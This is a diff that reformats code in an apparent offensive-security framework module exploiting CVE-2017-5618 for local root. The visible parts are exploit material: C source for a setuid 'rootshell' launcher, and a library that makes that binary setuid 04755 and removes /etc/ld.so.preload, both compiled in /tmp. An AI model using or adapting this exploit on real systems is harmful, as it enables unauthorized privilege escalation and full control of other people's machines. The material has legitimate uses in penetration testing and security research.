@@ -24,8 +24,7 @@ class CVE_2017_5618(ExecuteAbility):
         """Execute a shell"""
 
         # Write the rootshell source code
-        rootshell_source = textwrap.dedent(
-            f"""
+        rootshell_source = textwrap.dedent(f"""
                 #include <stdio.h>
                 #include <unistd.h>
                 int main(void){{
@@ -34,8 +33,7 @@ class CVE_2017_5618(ExecuteAbility):
                     const char* x[] = {{"{session.platform.shell}","-p",NULL}};
                     execvp(x[0], x);
                 }}
-                """
-        ).lstrip()
+                """).lstrip()
 
         with session.platform.tempfile(mode="w", directory="/tmp") as filp:
             rootshell = filp.name
@@ -49,8 +47,7 @@ class CVE_2017_5618(ExecuteAbility):
             raise ModuleFailed(f"compilation failed: {exc}") from exc
 
         # Write the library
-        libhack_source = textwrap.dedent(
-            f"""
+        libhack_source = textwrap.dedent(f"""
                 #include <stdio.h>
                 #include <sys/types.h>
                 #include <unistd.h>
@@ -60,8 +57,7 @@ class CVE_2017_5618(ExecuteAbility):
                     chmod("{rootshell}", 04755);
                     unlink("/etc/ld.so.preload");
                 }}
-                """
-        ).lstrip()
+                """).lstrip()
 
         # Compile libhack
         try:
